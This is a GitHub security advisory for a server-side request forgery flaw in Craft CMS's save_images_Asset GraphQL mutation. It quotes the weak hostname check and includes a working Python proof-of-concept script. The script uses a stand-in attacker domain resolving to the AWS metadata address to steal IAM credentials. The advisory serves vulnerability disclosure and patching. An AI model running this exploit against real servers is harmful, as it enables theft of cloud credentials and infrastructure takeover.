# [M] Craft CMS: save_images_Asset graphql mutation can be abused to exfiltrate AWS credentials of underlying host

## Summary
Severity: Medium
Advisory: GHSA-96pq-hxpw-rgh8
CVE: CVE-2026-25492
CWE: CWE-918
Ecosystem: Packagist
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-02-09
Source: https://github.com/advisories/GHSA-96pq-hxpw-rgh8
Type: github-advisory

## Affected
- Packagist: `craftcms/craft` — affected >=5.0.0-RC1 <5.8.22
- Packagist: `craftcms/craft` — affected >=3.5.0 <4.16.18

## Details
### Summary

- The save_images_Asset graphql mutation allows a user to give a url of an image to download.  (Url must use a domain, not a raw IP.)
- Attacker sets up domain attacker.domain with an A record of something like 169.254.169.254 (special AWS metadata IP)
- Attacker invokes save_images_Asset with url: http://attacker.domain/latest/meta-data/iam/security-credentials and filename "foo.txt"
- Craft fetches sensitive information on attacker's behalf, and makes it available for download at /assets/images/foo.txt
- Normal checks to verify that image is valid are bypassed because of .txt extension
- Normal checks to verify that url is not an IP address are bypassed because user provided a valid domain that resolves to a sensitive internal IP address

### Details

handleUpload() in src/gql/resolvers/mutations/Assets.php contains the code that processes the save_images_Asset mutation.

It has some basic validation logic for the url parameter (source of the image) and filename parameter (what to save image as):

```
   } elseif (!empty($fileInformation['url'])) {
            $url = $fileInformation['url'];

            // make sure the hostname is alphanumeric and not an IP address
            $hostname = parse_url($url, PHP_URL_HOST);
            if (
                !filter_var($hostname, FILTER_VALIDATE_DOMAIN, FILTER_FLAG_HOSTNAME) ||
                filter_var($hostname, FILTER_VALIDATE_IP)
            ) {
                throw new UserError("$url contains an invalid hostname.");
            }

            if (empty($fileInformation['filename'])) {
                $filename = AssetsHelper::prepareAssetName(pathinfo(UrlHelper::stripQueryString($url), PATHINFO_BASENAME));
            } else {
                $filename = AssetsHelper::prepareAssetName($fileInformation['filename']);
            }

            $extension = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
            if (is_array($allowedExtensions) && !in_array($extension, $allowedExtensions, true)) {
                throw new AssetDisallowedExtensionException(Craft::t('app', "“{$extension}” is not an allowed file extension."));
            }
```

The upshot of this validation is that url must contain a hostname, not an IP, and filename must contain an allowed extension.  If the allowed extension is a typical image extension, further validation will be done downstream  to verify that the downloaded content is in fact an image.

An authenticated attacker can trick this mutation into fetching sensitive AWS metadata, or other sensitive information from the craft instance's internal network.

- First, the attacker must register a domain -- e.g. attacker.domain.  
- Next, they must point their domain at the sensitive internal ip they'd like to access (e.g. 169.254.169.254)
- Next, they make a request to save_images_Asset with url set to http://attacker.domain/sensitive/path with filename set to "something.txt"
- Finally the attacker makes a http request to retrieve /assets/images/something.txt, which contains sensitive information


### PoC

#### Preconditions

- Graphql access must be enabled
- Attacker must have access to a graphql token
- Token must be configured to have access to save_images_Asset mutation
- Attacker must have configured a domain, "attacker.domain" pointing to the sensitive internal IP address they'd like to access
- .txt must be an allowed extension for uploads via save_images_Asset (as it is by default)

#### Code

```
import requests

# Replace GRAPHQL_ENDPOINT and BEARER_TOKEN per target.
GRAPHQL_ENDPOINT = 'http://localhost:8080/actions/graphql/api'
TOKEN = '<TOKEN HERE>'

mutation = '''
mutation SaveAsset($_file: FileInput!, $title: String, $focalPoint: String) { save_images_Asset(_file: $_file,
   title: $title, focalPoint: $focalPoint) { id title url filename focalPoint dateCreated } }
'''

variables = {
  '_file': {
    'url' : "http://attacker.domain/latest/meta-data/iam/security-credentials",
    'filename': 'foo.txt'

  },
  "title": "my photo",
  "focalPoint": "0.5;0.5"

}

resp = requests.post(GRAPHQL_ENDPOINT,
                     json={'query': mutation, 'variables': variables},
                     headers={'Authorization': f'Bearer {TOKEN}'})
print(resp.status_code, resp.text)
```

If attack is successful, response to running this script will be something like:

```
200 {"data":{"save_images_Asset":{"id":"211403","title":"my photo","url":"http://localhost:8080/assets/volumes/images/foo.txt","filename":"foo.txt","focalPoint":null,"dateCreated":"2025-12-18T09:45:24-08:00"}}}
```

Attacker can then download sensitive data by fetching http://localhost:8080/assets/volumes/images/foo.txt


### Impact

Impacted users must:

- Have graphql enabled
- Have a graphql token created with permissions to use save_images_Asset
- Have graphql token stolen by attacker or abused by malicious insider

Impact is heightened if:

- craft is running on something like an AWS EC2 instance, which has a well-known, sensitive internal http address that can be accessed to fetch metadata.  

Ultimate result is:

Attacker or malicious insider gets access to infrastructure craft is running on, not just craft itself.

## References
- https://github.com/craftcms/cms/security/advisories/GHSA-96pq-hxpw-rgh8
- https://nvd.nist.gov/vuln/detail/CVE-2026-25492
- https://github.com/craftcms/cms/commit/e838a221df2ab15cd54248f22fc8355d47df29ff
- https://github.com/craftcms/cms
- https://github.com/craftcms/cms/releases/tag/4.16.18
- https://github.com/craftcms/cms/releases/tag/5.8.22
